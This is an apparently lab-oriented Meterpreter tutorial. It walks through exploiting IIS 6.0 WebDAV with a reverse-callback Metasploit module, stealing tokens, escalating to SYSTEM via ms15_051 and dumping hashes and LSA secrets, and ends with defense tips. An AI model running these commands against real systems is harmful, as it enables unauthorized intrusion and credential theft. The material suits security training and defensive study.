

## How Meterpreter Works

1. **Stager Execution**
    
    - Triggered after a successful exploit.
        
    - Example: **bind** or **reverse TCP** stager.
        
2. **Reflective DLL Loading**
    
    - Injects Meterpreter DLL directly into memory for stealth.
        
3. **Secure Channel**
    
    - Establishes **AES-encrypted** communication between attacker and target.
        
4. **Extension Loading**
    
    - Loads extra modules such as:
        
        - `stdapi` – Core commands (file system, networking, etc.)
            
        - `priv` – Privilege escalation tools
            

---

## Common Meterpreter Commands

View help menu:

```
meterpreter > help
```

---

## Practical Example – Exploitation Workflow

### 1. Start Metasploit Database

```
msfdb run
```

---

### 2. Reconnaissance

Use Nmap through Metasploit:

```
msf6 > db_nmap -sV -p- -T5 -A 10.10.10.15
```

**Identifies:**

- Port 80 open
    
- Microsoft IIS httpd 6.0 → WebDAV vulnerabilities likely
    

---

### 3. Search & Use Exploit

Search for a matching module:

```
msf6 > search iis_webdav_upload_asp
```

Use the exploit:

```
msf6 > use exploit/windows/iis/iis_webdav_upload_asp
msf6 exploit(...) > set RHOST 10.10.10.15
msf6 exploit(...) > set LHOST tun0
msf6 exploit(...) > run
```

---

### 4. Gain Meterpreter Shell

Successful exploitation = Meterpreter session:

```
meterpreter >
```

_Note: Files may remain on the victim if cleanup fails._

---

### 5. Initial Privilege Check

Check current user:

```
meterpreter > getuid
```

If low privilege, try token impersonation:

```
meterpreter > ps
meterpreter > steal_token [PID]
meterpreter > getuid
```

---

### 6. Local Privilege Escalation

Run the local exploit suggester:

```
meterpreter > bg
msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(...) > set SESSION [ID]
msf6 post(...) > run
```

Apply suggested exploit:

```
msf6 > use exploit/windows/local/ms15_051_client_copy_image
msf6 exploit(...) > set SESSION [ID]
msf6 exploit(...) > set LHOST tun0
msf6 exploit(...) > run
```

---

### 7. Achieve SYSTEM Privileges

Confirm privilege level:

```
meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM
```

---

## Post-Exploitation Activities

Once **SYSTEM-level access** is obtained:

- **Extract password hashes**
    
    ```
    meterpreter > hashdump
    ```
    
- **Dump LSA secrets**
    
    ```
    meterpreter > lsa_dump_secrets
    ```
    
- **Pivot within the network**
    
    - Lateral movement
        
    - User impersonation
        
    - Access additional internal systems
        

---

## Defense Tips (For Admins)

- Patch vulnerable services immediately.
    
- Restrict unnecessary services like WebDAV.
    
- Use endpoint detection and response (EDR) tools.
    
- Monitor for suspicious outbound connections.
    
- Employ least-privilege principles and segment networks.